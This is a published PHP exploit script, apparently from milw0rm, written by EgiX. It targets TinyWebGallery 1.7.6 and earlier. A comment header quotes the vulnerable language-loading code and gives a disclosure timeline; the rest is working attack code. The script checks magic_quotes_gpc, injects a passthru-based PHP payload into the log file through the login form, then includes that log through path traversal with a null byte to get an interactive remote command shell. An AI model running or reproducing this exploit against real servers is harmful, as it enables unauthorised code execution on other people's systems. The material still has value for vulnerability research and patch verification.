<html><head><title>TinyWebGallery <= 1.7.6 LFI / Remote Code Execution Exploit</title></head><pre>&lt;?php

/*
	-----------------------------------------------------------
	TinyWebGallery &lt;= 1.7.6 LFI / Remote Code Execution Exploit
	-----------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.tinywebgallery.com/
	details..: this vulnerability drift from QuiXplorer (http://quixplorer.sourceforge.net/)

	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /admin/_include/init.php

	110.	// Get Language
	111.	if (isset($GLOBALS['__GET'][&quot;lang&quot;]))  $GLOBALS[&quot;lang&quot;] = $GLOBALS[&quot;language&quot;] = $_SESSION[&quot;admin_lang&quot;] =  $GLOBALS['__GET'][&quot;lang&quot;];
	112.	elseif (isset($GLOBALS['__POST'][&quot;lang&quot;])) $GLOBALS[&quot;lang&quot;] = $GLOBALS[&quot;language&quot;] = $_SESSION[&quot;admin_lang&quot;] =  $GLOBALS['__POST'][&quot;lang&quot;];
	113.	else if (isset($_SESSION[&quot;admin_lang&quot;])) $GLOBALS[&quot;lang&quot;] = $GLOBALS[&quot;language&quot;] = $_SESSION[&quot;admin_lang&quot;];  
	114.	else $GLOBALS[&quot;language&quot;] = $GLOBALS[&quot;default_language&quot;];
	115.	
			[...]
	138.	
	139.	// ------------------------------------------------------------------------------
	140.	// Necessary files
	141.	require _QUIXPLORER_PATH . &quot;/_config/conf.php&quot;;
	142.	
	143.	if (file_exists(_QUIXPLORER_PATH . &quot;/_lang/&quot; . $GLOBALS[&quot;language&quot;] . &quot;.php&quot;))
	144.	    require _QUIXPLORER_PATH . &quot;/_lang/&quot; . $GLOBALS[&quot;language&quot;] . &quot;.php&quot;;
	145.	else if (file_exists(_QUIXPLORER_PATH . &quot;/_lang/&quot; . $GLOBALS[&quot;default_language&quot;] . &quot;.php&quot;))
	146.	    require _QUIXPLORER_PATH . &quot;/_lang/&quot; . $GLOBALS[&quot;default_language&quot;] . &quot;.php&quot;;
	147.	else
	148.	    require _QUIXPLORER_PATH . &quot;/_lang/en.php&quot;;

	An attacker could be able to include arbitrary local files through the require function at line 144, due to
	$_GET['lang'] parameter isn't properly sanitised. Successful exploitation requires magic_quotes_gpc = off

	[-] Disclosure timeline:
		
	[14/04/2009] - Bug discovered
	[25/04/2009] - Vendor contacted
	[26/04/2009] - Vendor replied
	[26/04/2009] - Fix released: http://www.tinywebgallery.com/forum/viewtopic.php?t=1653
	[08/05/2009] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die(&quot;\nsocket_create(): &quot; . socket_strerror($s) . &quot;\n&quot;);

	if (socket_connect($s, $host, 80) == false)
	  die(&quot;\nsocket_connect(): &quot; . socket_strerror(socket_last_error()) . &quot;\n&quot;);

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

function check_target()
{
	global $host, $path;

	$packet  = &quot;GET {$path}info.php?showphpinfo=true HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	preg_match('/magic_quotes_gpc&lt;\/td&gt;&lt;td class=&quot;v&quot;&gt;(.*)&lt;\/td&gt;&lt;td/', http_send($host, $packet), $match);

	if ($match[1] != &quot;Off&quot;) die(&quot;\n[-] Exploit failed...magic_quotes_gpc = on\n&quot;);
}

function inject_code()
{
	global $host, $path;

	$code	 = &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die} ?&gt;&quot;;
	$payload = &quot;p_user={$code}&amp;p_pass=&quot;;

	$packet  = &quot;POST {$path}admin/index.php?action=login HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	http_send($host, $packet);
}

print &quot;\n+---------------------------------------------------------------------+&quot;;
print &quot;\n| TinyWebGallery &lt;= 1.7.6 LFI / Remote Code Execution Exploit by EgiX |&quot;;
print &quot;\n+---------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /twg/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

check_target();
inject_code();

$packet  = &quot;GET {$path}admin/index.php?lang=../../counter/_twg.log%%00 HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while (1)
{
	print &quot;\ntwg-shell# &quot;;
	if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;
	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
	preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed...\n&quot;);
}

?&gt;

# milw0rm.com [2009-05-08]</pre></html>